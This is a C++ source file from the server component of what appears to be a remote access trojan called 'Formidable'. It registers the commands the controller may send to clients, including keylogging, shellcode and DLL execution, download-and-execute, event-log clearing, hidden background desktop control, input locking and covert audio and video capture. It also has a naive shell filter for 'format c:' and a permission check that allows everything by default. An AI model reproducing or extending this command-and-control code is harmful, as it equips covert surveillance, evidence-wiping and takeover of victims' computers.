#include "CommandValidator.h"
#include "../Utils/Logger.h"
#include "../../../Common/Config.h" // Assuming this has command definitions

namespace Formidable {
namespace Server {
namespace Security {

std::set<int> CommandValidator::s_validCommands;
int CommandValidator::s_maxPacketSize = 1024 * 1024 * 10; // Default 10MB
std::mutex CommandValidator::s_mutex;
bool CommandValidator::s_initialized = false;

// PermissionChecker static members
std::map<uint32_t, std::set<uint32_t>> CommandValidator::PermissionChecker::s_clientPermissions;
std::mutex CommandValidator::PermissionChecker::s_permMutex;

void CommandValidator::InitializeCommands() {
    if (s_initialized) return;
    
    // Core Commands
    s_validCommands.insert(CMD_HEARTBEAT); 
    s_validCommands.insert(CMD_GET_SYSINFO);
    s_validCommands.insert(CMD_SETTINGS);
    
    // File Commands
    s_validCommands.insert(CMD_FILE_LIST);
    s_validCommands.insert(CMD_FILE_DOWNLOAD);
    s_validCommands.insert(CMD_FILE_UPLOAD);
    s_validCommands.insert(CMD_FILE_DELETE);
    s_validCommands.insert(CMD_FILE_RENAME);
    s_validCommands.insert(CMD_FILE_RUN);
    s_validCommands.insert(CMD_FILE_DATA);
    s_validCommands.insert(CMD_DRIVE_LIST);
    s_validCommands.insert(CMD_FILE_MKDIR);
    s_validCommands.insert(CMD_FILE_DOWNLOAD_DIR);
    s_validCommands.insert(CMD_FILE_SIZE);
    s_validCommands.insert(CMD_FILE_SEARCH);
    s_validCommands.insert(CMD_FILE_COMPRESS);
    s_validCommands.insert(CMD_FILE_UNCOMPRESS);
    s_validCommands.insert(CMD_FILE_MONITOR);
    s_validCommands.insert(CMD_FILE_PREVIEW);
    s_validCommands.insert(CMD_FILE_HISTORY);
    s_validCommands.insert(CMD_FILE_PERF);
    
    // Process Commands
    s_validCommands.insert(CMD_PROCESS_LIST);
    s_validCommands.insert(CMD_PROCESS_KILL);
    s_validCommands.insert(CMD_PROCESS_MODULES);
    s_validCommands.insert(CMD_PROCESS_SUSPEND);
    s_validCommands.insert(CMD_PROCESS_RESUME);
    s_validCommands.insert(CMD_NETWORK_LIST);

    // Window/Desktop
    s_validCommands.insert(CMD_WINDOW_LIST);
    s_validCommands.insert(CMD_SCREEN_CAPTURE);
    s_validCommands.insert(CMD_WINDOW_SNAPSHOT);
    s_validCommands.insert(CMD_WINDOW_CTRL);
    s_validCommands.insert(CMD_MOUSE_EVENT);
    s_validCommands.insert(CMD_KEY_EVENT);
    s_validCommands.insert(CMD_SCREEN_FPS);
    s_validCommands.insert(CMD_SCREEN_QUALITY);
    s_validCommands.insert(CMD_SCREEN_COMPRESS);
    s_validCommands.insert(CMD_SCREEN_LOCK_INPUT);
    s_validCommands.insert(CMD_SCREEN_BLANK);
    s_validCommands.insert(CMD_SWITCH_MONITOR);

    // Terminal
    s_validCommands.insert(CMD_TERMINAL_OPEN);
    s_validCommands.insert(CMD_TERMINAL_DATA);
    s_validCommands.insert(CMD_SHELL_EXEC);
    s_validCommands.insert(CMD_TERMINAL_CLOSE);
    
    // AV
    s_validCommands.insert(CMD_VOICE_STREAM);
    s_validCommands.insert(CMD_VIDEO_STREAM);
    s_validCommands.insert(CMD_AUDIO_START);
    s_validCommands.insert(CMD_AUDIO_STOP);
    
    // System
    s_validCommands.insert(CMD_SERVICE_LIST);
    s_validCommands.insert(CMD_REGISTRY_CTRL);
    s_validCommands.insert(CMD_SESSION_MANAGE);
    s_validCommands.insert(CMD_SERVICE_START);
    s_validCommands.insert(CMD_SERVICE_STOP);
    s_validCommands.insert(CMD_SERVICE_DELETE);
    s_validCommands.insert(CMD_POWER_SHUTDOWN);
    s_validCommands.insert(CMD_POWER_REBOOT);
    s_validCommands.insert(CMD_POWER_LOGOUT);
    s_validCommands.insert(CMD_CLEAN_EVENT_LOG);
    
    // Misc
    s_validCommands.insert(CMD_KEYLOG);
    s_validCommands.insert(CMD_CLIPBOARD_GET);
    s_validCommands.insert(CMD_CLIPBOARD_SET);
    s_validCommands.insert(CMD_GEN_SERVICE);
    s_validCommands.insert(CMD_PROXY_MAP);
    s_validCommands.insert(CMD_DOWNLOAD_EXEC);
    s_validCommands.insert(CMD_UPLOAD_EXEC);
    s_validCommands.insert(CMD_OPEN_URL);
    s_validCommands.insert(CMD_UPDATE_CLIENT);
    
    s_validCommands.insert(CMD_LOAD_MODULE);
    s_validCommands.insert(CMD_UNINSTALL);
    s_validCommands.insert(CMD_RECONNECT);
    s_validCommands.insert(CMD_EXECUTE_DLL);
    s_validCommands.insert(CMD_EXECUTE_SHELLCODE);
    
    s_validCommands.insert(CMD_SET_GROUP);
    s_validCommands.insert(CMD_MESSAGEBOX);
    s_validCommands.insert(CMD_EXEC_GET_OUTPUT);

    // Background Screen Commands
    s_validCommands.insert(CMD_BACKGROUND_CREATE);
    s_validCommands.insert(CMD_BACKGROUND_EXECUTE);
    s_validCommands.insert(CMD_BACKGROUND_FILE_OP);
    s_validCommands.insert(CMD_BACKGROUND_PROCESS);
    s_validCommands.insert(CMD_BACKGROUND_SCREEN_CAPTURE);
    s_validCommands.insert(CMD_BACKGROUND_SCREEN_CONTROL);
    s_validCommands.insert(CMD_BACKGROUND_SWITCH_BACK);
    
    s_initialized = true;
}

bool CommandValidator::ValidateCommand(uint32_t cmd) {
    if (!s_initialized) InitializeCommands();
    // Strict validation
    if (s_validCommands.find(cmd) == s_validCommands.end()) {
        Formidable::Server::Utils::Logger::Log(Formidable::Server::Utils::LogLevel::LL_WARNING, "CommandValidator: Rejected invalid command " + std::to_string(cmd));
        return false;
    }
    return true;
}

bool CommandValidator::IsValidCommand(int commandId) {
    return ValidateCommand(static_cast<uint32_t>(commandId));
}

bool CommandValidator::CheckCommandPermissions(uint32_t clientId, uint32_t cmd) {
    return PermissionChecker::HasPermission(clientId, cmd);
}

bool CommandValidator::IsValidPacketSize(int commandId, int packetSize) {
    if (packetSize < 0) return false;
    
    std::lock_guard<std::mutex> lock(s_mutex);
    return packetSize <= s_maxPacketSize;
}

void CommandValidator::SetMaxPacketSize(int size) {
    std::lock_guard<std::mutex> lock(s_mutex);
    s_maxPacketSize = size;
}

bool CommandValidator::ValidateArguments(const CommandPkg* pkg, size_t dataSize) {
    if (!pkg) return false;
    // Check if dataSize is sufficient for the structure
    // sizeof(CommandPkg) includes 1 byte for data, so strict check should be >= sizeof(CommandPkg) - 1
    if (dataSize < sizeof(CommandPkg) - 1) return false; 
    
    return true;
}

// CommandFilter
bool CommandValidator::CommandFilter::FilterCommand(uint32_t cmd, const std::string& data) {
    // Check for malicious patterns in data
    // Example: check for "rm -rf /" equivalents in shell commands
    if (cmd == CMD_SHELL_EXEC) {
        if (data.find("format") != std::string::npos && data.find("c:") != std::string::npos) {
             return false; // Prevent formatting C drive
        }
    }
    return true;
}

bool CommandValidator::CommandFilter::IsMaliciousCommand(uint32_t cmd) {
    // Placeholder for known bad command IDs if any (none for now as we whitelist)
    return false;
}

std::vector<std::string> CommandValidator::CommandFilter::GetAllowedCommands() {
    return std::vector<std::string>(); 
}

// PermissionChecker
bool CommandValidator::PermissionChecker::HasPermission(uint32_t clientId, uint32_t cmd) {
    std::lock_guard<std::mutex> lock(s_permMutex);
    auto it = s_clientPermissions.find(clientId);
    if (it == s_clientPermissions.end()) {
        return true; // Default to allow all if no permissions set
    }
    return it->second.find(cmd) != it->second.end();
}

void CommandValidator::PermissionChecker::SetCommandPermissions(uint32_t clientId, const std::vector<uint32_t>& allowedCommands) {
    std::lock_guard<std::mutex> lock(s_permMutex);
    std::set<uint32_t> perms(allowedCommands.begin(), allowedCommands.end());
    s_clientPermissions[clientId] = perms;
}

} // namespace Security
} // namespace Server
} // namespace Formidable
